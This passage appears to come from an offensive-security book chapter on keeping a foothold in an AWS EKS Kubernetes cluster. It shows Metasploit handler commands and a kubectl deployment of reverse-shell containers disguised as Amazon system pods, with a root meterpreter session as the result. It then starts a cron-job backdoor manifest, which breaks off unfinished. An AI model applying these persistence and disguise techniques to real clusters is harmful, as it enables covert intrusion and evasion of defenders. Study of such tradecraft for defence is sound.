  md: "```\nmsf multi/handler> set ExitOnSession false\nmsf multi/handler> run -j\n\
    [*] Exploit running as background job 3\n```\n\nWe push this updated manifest\
    \ to the cluster, which will create the DaemonSet object along with the three\
    \ reverse shell containers:\n\n```\nshell> kubectl -f apply -n kube-system aws-ds-manifest.yaml\n\
    daemonset.apps/aws-node-cni created\n```\n\n# Metasploit container\n\n```\n[*]\
    \ https://0.0.0.0:443 handling request from 34.244.205.187;\nmeterpreter > getuid\n\
    Server username: uid=0, gid=0, euid=0, egid=0\n```\n\nAwesome. Nodes can break\
    \ down and pods can be wiped out, but so long as there are nodes bearing the label\
    \ kafka-collector-broker, our evil containers will be scheduled on them time and\
    \ time again, resurrecting our backdoor. After all, who will dare question Amazon-looking\
    \ pods obviously related to a critical component of the EKS cluster? Security\
    \ by obscurity may not be a winning defense strategy, but it’s a golden rule in\
    \ the offensive world.\n\nNOTE We can achieve the same resilience using a ReplicaSet\
    \ object instead of a DaemonSet. A ReplicaSet ensures there is always a fixed\
    \ number of copies of a given pod. We can configure this ReplicaSet to mimic the\
    \ attributes and labels of the aws-node DaemonSet. The advantage of this method\
    \ is that we can literally name the pods aws-node instead of aws-node-cni since\
    \ they will belong to a different Kubernetes object (ReplicaSet instead of DaemonSet).\n\
    \n# The Stealthy Backdoor\n\nOur stable backdoor is very resilient and will survive\
    \ node termination, but it’s a bit loud. The pod and DaemonSet are constantly\
    \ running and visible on the cluster. We therefore complement this backdoor with\
    \ a stealthier one that only fires up occasionally.\n\nWe set up a cron job at\
    \ the cluster level that runs every day at 10 AM to bring a pod to life. We’ll\
    \ use a different AWS account than the one present in the DaemonSet to make sure\
    \ we’re not sharing data or techniques between our backdoors. Listing 9-6 shows\
    \ the manifest file of the cron job.\n\n```\napiVersion: batch/v1beta1\nkind:\
    \ CronJob\nmetadata:\n  name: metrics-collect\nspec:\n  schedule: \"0 10 * * *\"\
    \n  jobTemplate:\n```"
